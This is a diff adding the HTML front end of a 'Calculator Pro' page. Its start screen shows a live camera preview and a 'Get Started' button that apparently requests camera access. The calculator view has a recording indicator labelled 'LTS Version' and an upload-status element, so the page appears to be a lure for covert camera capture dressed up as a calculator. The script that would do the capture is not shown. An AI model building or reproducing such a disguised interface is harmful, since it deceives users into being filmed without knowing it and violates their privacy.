@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Calculator</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="permission-screen" id="permissionScreen">
+            <div class="permission-box">
+                <h2>Calculator Pro</h2>
+                
+                <div class="camera-preview">
+                    <video id="previewVideo" autoplay muted playsinline></video>
+                </div>
+                <button id="allowCamera" class="btn-primary">Get Started</button>
+               
+            </div>
+        </div>
+
+        <div class="calculator-container hidden" id="calculatorContainer">
+            <div class="camera-indicator">
+                <div class="recording-dot"></div>
+                <span>LTS Version</span>
+            </div>
+            
+            <div class="calculator">
+                <div class="display">
+                    <div class="previous-operand" id="previousOperand"></div>
+                    <div class="current-operand" id="currentOperand">0</div>
+                </div>
+                <div class="buttons">
+                    <button class="clear">C</button>
+                    <button class="delete">DEL</button>
+                    <button class="operator">%</button>
+                    <button class="operator">÷</button>
+                    
+                    <button class="number">7</button>
+                    <button class="number">8</button>
+                    <button class="number">9</button>
+                    <button class="operator">×</button>
+                    
+                    <button class="number">4</button>
+                    <button class="number">5</button>
+                    <button class="number">6</button>
+                    <button class="operator">-</button>
+                    
+                    <button class="number">1</button>
+                    <button class="number">2</button>
+                    <button class="number">3</button>
+                    <button class="operator">+</button>
+                    
+                    <button class="number zero">0</button>
+                    <button class="number">.</button>
+                    <button class="equals">=</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="upload-status" id="uploadStatus"></div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
